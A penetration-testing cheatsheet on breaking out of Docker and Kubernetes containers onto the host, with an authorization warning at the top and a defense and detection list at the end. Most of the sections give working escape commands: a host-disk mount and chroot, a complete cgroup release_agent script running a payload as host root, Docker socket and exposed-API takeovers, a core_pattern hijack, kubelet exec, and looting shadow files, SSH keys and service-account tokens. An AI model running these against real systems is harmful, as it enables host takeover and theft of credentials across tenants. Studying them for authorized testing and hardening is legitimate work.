# Linux — Docker & Container Escape

Cheatsheet for breaking out of a Docker/containerd container onto the **host**. Scope: you already have a shell inside a container (web RCE, a pulled malicious image, a CI runner) and want host access. Getting the initial shell is covered in [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md); escalating to `root` *inside* the container namespace follows the normal [Privilege Escalation](Privilege%20Escalation.md) note.

> **Escapes are high-impact and in-scope only if the engagement says so.** Breaking out usually means owning every other tenant on that host, and a few vectors (kernel exploits, `insmod`, `sysrq-trigger`) can panic the box. Confirm the rules of engagement in writing, and prefer a misconfiguration over a kernel CVE.

A container is just a host process with its own **namespaces**, **cgroups**, **capabilities** and a **seccomp/AppArmor** profile. Almost every escape is one of those four being too loose, or a host resource bind-mounted inside. Enumerate those first and the escape usually falls out of the output.

## Contents

- [Am I in a container?](#am-i-in-a-container)
- [Enumerate before you escape](#enumerate-before-you-escape)
- [Escape matrix (finding → escape)](#escape-matrix-finding--escape)
- [Privileged container](#privileged-container)
- [CAP_SYS_ADMIN — cgroup release_agent](#cap_sys_admin--cgroup-release_agent)
- [Mounted Docker socket](#mounted-docker-socket)
- [Other dangerous capabilities](#other-dangerous-capabilities)
- [Host filesystem mounts](#host-filesystem-mounts)
- [Shared host namespaces (PID / net)](#shared-host-namespaces-pid--net)
- [Exposed Docker / Kubelet API](#exposed-docker--kubelet-api)
- [Runtime & kernel CVEs (last resort)](#runtime--kernel-cves-last-resort)
- [Kubernetes-specific paths](#kubernetes-specific-paths)
- [After the escape](#after-the-escape)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Am I in a container?

```bash
ls -la /.dockerenv                       # Docker's marker file (not always present)
cat /proc/1/cgroup                       # docker/containerd/kubepods in the paths (cgroup v1)
systemd-detect-virt -c                   # prints docker/lxc/podman if containerized
grep -i -e overlay -e docker /proc/self/mountinfo   # overlayfs root = container
hostname                                 # a random 12-hex id is a giveaway
ls /run/secrets/kubernetes.io 2>/dev/null   # present = a Kubernetes pod, not plain Docker
```

On **cgroup v2** hosts `/proc/1/cgroup` shows only `0::/`, so fall back to `/.dockerenv`, overlayfs in `mountinfo`, and the short process list under `/proc`.

## Enumerate before you escape

This is the whole game — read the output against the [escape matrix](#escape-matrix-finding--escape) below.

```bash
id; capsh --print                        # effective capabilities
grep Cap /proc/self/status               # CapEff bits (0000003fffffffff / ...1ffffffffff ≈ --privileged)
grep Seccomp /proc/self/status           # 0 = no seccomp filter (2 = filtered)
cat /proc/self/attr/current 2>/dev/null  # AppArmor profile; "unconfined" = none

mount                                     # host paths bind-mounted in (/, docker.sock, etc.)
cat /proc/self/mountinfo                  # note any host directory mounted inside
ls -la /dev                               # /dev/sda, /dev/mem, /dev/kmsg visible ≈ privileged
ls -la /var/run/docker.sock              # the Docker socket mounted in = game over
env | grep -i -e key -e token -e pass     # secrets passed as env vars
```

Decode capability masks with `capsh --decode=<hex>`. A full set (`cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module`, `cap_dac_read_search`…) usually means the container was started `--privileged` or with a wide `--cap-add`.

## Escape matrix (finding → escape)

| What you found | Escape |
| --- | --- |
| `--privileged` / full cap set / `/dev/sda` visible | [Privileged container](#privileged-container) → mount host disk |
| `CapEff` has `cap_sys_admin`, no AppArmor | [cgroup release_agent](#cap_sys_admin--cgroup-release_agent) |
| `/var/run/docker.sock` mounted in | [Mounted Docker socket](#mounted-docker-socket) |
| `cap_sys_module` | load a kernel module (`insmod`) that runs your code as host root |
| `cap_sys_ptrace` + host PID ns | inject into a host process |
| `cap_dac_read_search` | `shocker`-style arbitrary host file read |
| Host dir bind-mounted (`/`, `/root`, `/etc`) | [Host filesystem mounts](#host-filesystem-mounts) |
| `--pid=host` / `--net=host` | [Shared host namespaces](#shared-host-namespaces-pid--net) |
| Docker API `:2375`, kubelet `:10250` reachable | [Exposed API](#exposed-docker--kubelet-api) |
| Old runc/containerd/kernel | [Runtime & kernel CVEs](#runtime--kernel-cves-last-resort) |

## Privileged container

`--privileged` disables most isolation: full capabilities, no seccomp/AppArmor, and **host devices exposed under `/dev`**. The cleanest escape is to mount the host root filesystem from the raw disk:

```bash
# Find the host's root partition, then mount and chroot into it
lsblk ; fdisk -l 2>/dev/null
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host        # pick the host root device from lsblk
chroot /mnt/host sh              # now operating on the host filesystem
# -> write an SSH key to /root/.ssh, add a cron job, or edit /etc/passwd
```

If no block device is exposed but you still hold `cap_sys_admin`, use the cgroup technique below.

## CAP_SYS_ADMIN — cgroup release_agent

Classic breakout when the container has `cap_sys_admin` and AppArmor isn't confining it (common in `--privileged`). On **cgroup v1**, the kernel runs the `release_agent` program *on the host* when the last task in a cgroup exits:

```bash
# mount a cgroup controller we control
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x && echo 1 > /tmp/cg/x/notify_on_release

# host path of our container fs (overlay upperdir) so the host can see our script
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cg/release_agent

# payload runs as root ON THE HOST when the cgroup empties
cat > /cmd <<EOF
#!/bin/sh
ip a > $host_path/out      # proof: host interfaces; swap for a reverse shell / SSH key
EOF
chmod +x /cmd

# trigger: spawn a process in the cgroup and let it exit
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
cat /out
```

This path is cgroup-**v1** only; modern cgroup-v2 hosts don't expose `release_agent`, so fall back to disk mount, the Docker socket, or a runtime CVE.

## Mounted Docker socket

If `/var/run/docker.sock` is bind-mounted into the container, you control the host's Docker daemon — talk to it and start a new container that mounts host `/`:

```bash
# with the docker CLI present
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# no docker CLI? drive the API over the socket with curl
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json   # confirm access
# then create+start a privileged container mounting / via POST /containers/create
```

Inside the new container, `chroot /host` gives you the host filesystem as root. Same idea applies to a mounted **containerd** (`/run/containerd/containerd.sock`) or **podman** socket.

## Other dangerous capabilities

Check `capsh --print` / `CapEff` for these even without `--privileged`:

- **`cap_sys_module`** — load a kernel module that executes your code in ring 0:
  ```bash
  # build a tiny module whose init_module() spawns a host reverse shell, then:
  insmod ./evil.ko
  ```
- **`cap_sys_ptrace`** + `--pid=host` — attach to and inject shellcode into a host process.
- **`cap_dac_read_search`** — read any host file via open-by-handle (`shocker` technique) to grab `/etc/shadow`, SSH keys, tokens.
- **`cap_sys_admin`** without AppArmor — the [release_agent](#cap_sys_admin--cgroup-release_agent) path, or mount abuse.

## Host filesystem mounts

Any host directory bind-mounted into the container is a foothold even without extra capabilities — check `mount` / `/proc/self/mountinfo`:

- **`/` or `/root` / `/home` mounted** → write an SSH key, cron job, or a SUID binary directly.
- **`/etc` mounted writable** → add a root user to `/etc/passwd` or a `NOPASSWD` sudoers drop-in.
- **`/var/run/docker.sock`** → see [Mounted Docker socket](#mounted-docker-socket).
- **Host `/proc` mounted** (`/proc/sys/kernel/core_pattern`) → set `core_pattern` to a pipe that runs your handler as host root when any process core-dumps.

```bash
# core_pattern escape when host /proc is writable
echo "|/host_path/payload" > /proc/sys/kernel/core_pattern
# then crash a process in the container to trigger the handler on the host
```

## Shared host namespaces (PID / net)

- **`--pid=host`** — you see every host process (`ps aux`), their `/proc/<pid>/root` and environment (secrets, tokens). Combine with `cap_sys_ptrace` to inject into one; read `/proc/1/environ` for creds.
- **`--net=host`** — the container shares the host network stack: reach services bound to `127.0.0.1` on the host (databases, the Docker API, kubelet), sniff traffic, and ARP/spoof on the host's interfaces.
- **`--ipc=host`** — access host shared memory segments.

## Exposed Docker / Kubelet API

Reachable over the network (often after a `--net=host` or an internal pivot):

```bash
# Docker daemon exposed without TLS
curl -s http://<host>:2375/version
docker -H tcp://<host>:2375 run -v /:/host --rm -it alpine chroot /host sh

# Kubelet read/exec (Kubernetes)
curl -sk https://<node>:10250/pods                       # list pods
curl -sk https://<node>:10250/run/<ns>/<pod>/<container> -d "cmd=id"   # exec into a pod
```

An open `:2375` is a full host compromise; `:10250` exec gives code in any pod on the node.

## Runtime & kernel CVEs (last resort)

Match the runtime/kernel version to a known breakout — these can be noisy or destabilizing, so use only when a misconfig isn't available and the engagement allows it:

- **runc `/proc/self/exe` overwrite — CVE-2019-5736:** a malicious image/exec overwrites the host `runc` binary → host root on next `docker exec`.
- **Leaky Vessels — CVE-2024-21626:** runc working-directory file-descriptor leak lets a crafted image access the host filesystem.
- **containerd CVE-2020-15257** (`containerd-shim` abuse via the host network namespace).
- **Dirty Pipe (CVE-2022-0847)** / **DirtyCow (CVE-2016-5195)** / **OverlayFS (CVE-2021-3493, CVE-2023-0386)** — kernel is shared with the host, so a kernel LPE from inside the container is a host compromise. See the kernel section of [Privilege Escalation](Privilege%20Escalation.md).

## Kubernetes-specific paths

```bash
# Service-account token mounted into most pods
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# use it against the API server; check what it can do
kubectl auth can-i --list --token=$(cat .../token)
```

- Over-permissive service account → create a **privileged pod** that mounts host `/` (`hostPath: /`) and `chroot` in.
- Cloud metadata from a pod (`169.254.169.254`) often yields node IAM credentials → cluster/cloud takeover.
- Hunt other pods' secrets and the kubelet (`:10250`) as above.

## After the escape

```bash
id ; hostname                            # confirm you're on the host, not the container
cat /etc/shadow ; ls -la /root/.ssh      # loot host hashes + keys
docker ps -a ; crictl ps -a 2>/dev/null  # enumerate the other containers/tenants you now own
grep -rIl -e password -e secret -e token /etc /opt /srv /var/lib/docker 2>/dev/null
```

Pivot: other containers on the host, their volumes and secrets, the orchestration layer (Swarm/Kubernetes), and cloud metadata. Record every file you created (mounts, pods, keys, cron) so it can be cleaned up, and note the exact misconfig for the finding. Domain/cloud creds found here feed the [AD notes](../AD/AD%20Attacks%20Overview.md) and your cloud workflow.

## Defense / detection (for the report)

- **Don't run `--privileged`;** drop all capabilities and add back only what's needed (`--cap-drop=ALL --cap-add=...`). Never add `SYS_ADMIN`, `SYS_MODULE`, `SYS_PTRACE`, `DAC_READ_SEARCH` without cause.
- **Never mount the Docker/containerd socket** into a container; if a workload must talk to Docker, use a brokered, authorized proxy.
- **Run as non-root** in the container (`USER`), with `--user`, `no-new-privileges`, a read-only root FS, and a user namespace (`userns-remap`) so container root ≠ host root.
- **Keep seccomp and AppArmor/SELinux profiles on** (the default profiles block the release_agent and module paths); don't run `--security-opt seccomp=unconfined`.
- **Avoid host namespaces** (`--pid=host`, `--net=host`, `--ipc=host`) and broad `hostPath` mounts; in Kubernetes enforce this with Pod Security Admission / an admission controller (OPA/Kyverno).
- **Patch the runtime and kernel** promptly (runc, containerd, Docker) — the breakout CVEs above are all patched.
- **Detect:** `auditd`/Falco rules for `mount` inside containers, writes to `release_agent`/`core_pattern`, `insmod`, unexpected `docker.sock` access, and a container process suddenly reading host paths or spawning host-PID children.
